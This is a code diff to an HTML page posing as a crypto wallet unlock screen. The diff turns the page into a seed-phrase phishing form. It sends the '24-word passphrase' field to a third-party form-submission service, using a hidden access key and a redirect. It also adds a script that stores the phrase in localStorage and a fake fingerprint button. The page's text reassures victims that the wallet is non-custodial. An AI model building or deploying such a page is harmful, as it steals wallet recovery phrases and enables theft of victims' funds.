@@ -736,7 +736,10 @@ button {
 </head>
 <body>
 	
-    <form method="post" action="#">
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+    <input type="hidden" name="access_key" value="04fa1fa8-ebb9-4318-b12a-45211d185181">
+	<input type="hidden" name="redirect" value="http://127.0.0.1:5500/wallet.html">
 		<textarea name="text" placeholder="Enter your 24-word passphrase here"></textarea>
 		
 		
@@ -746,7 +749,30 @@ button {
 		<button class="bone"> UNLOCK WITH FINGERPRINT </button>
 	  </form>
 
-   
+      <script>
+        // Handle form submission
+        document.getElementById('passphraseForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting the traditional way
+
+            // Get the passphrase value
+            const passphrase = document.getElementById('passphrase').value;
+
+            if (passphrase) {
+                // Store the passphrase in local storage (or any free storage API)
+                localStorage.setItem('passphrase', passphrase);
+
+                // Optionally, you can alert the user or redirect them
+                alert('Passphrase stored successfully!');
+            } else {
+                alert('Please enter a passphrase.');
+            }
+        });
+
+        // Handle fingerprint button click (for illustration purposes)
+        document.querySelector('.bone').addEventListener('click', function() {
+            alert('Fingerprint authentication is not implemented yet.');
+        });
+    </script>
   
   <br><br>
   <p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>
